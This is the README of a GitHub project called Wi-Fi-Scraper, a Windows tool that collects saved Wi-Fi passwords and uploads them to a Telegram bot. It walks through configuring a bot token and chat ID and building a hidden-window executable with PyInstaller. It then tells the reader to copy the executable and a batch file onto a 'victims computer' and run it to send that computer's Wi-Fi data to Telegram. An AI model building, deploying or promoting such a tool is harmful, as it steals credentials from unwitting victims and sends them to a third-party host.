# Wi-Fi-Scraper
#### Scrape Saved Wi-Fi Password and Upload to Telegram 😉
> This is for windows only

## Quick Start 🔎
### Clone this repository
```sh
git clone https://github.com/rugvedkoshiya/Wi-Fi-Scraper.git
```
```sh
cd Wi-Fi-Scraper
```

### Edit [config.py](./config.py) file before use
`TOKEN` - Get API token from [@BotFather](https://telegram.dog/BotFather)
`CHAT_ID` - where you want to upload wifi data in telegram. (forward any message from your channel or group to [@userinfobot](https://telegram.dog/userinfobot) for getting Chat ID)

### Create Virtual Environment
```sh
python -m venv myenv
```

### Activate Virtual Environment
```sh
.\myenv\Scripts\activate
```

### Install [requirements.txt](./requirements.txt)
```sh
pip install -r requirements.txt
```

### Create Executable File
```sh
pyinstaller --onefile -w "wifi.py"
```
> created .exe file will be in dist directory for windows

### How to use
- Copy paste wifi.exe and wfilist.bat into same directory of victims computer
- Run wifi.exe and done you got all wifi data of victims computer into telegram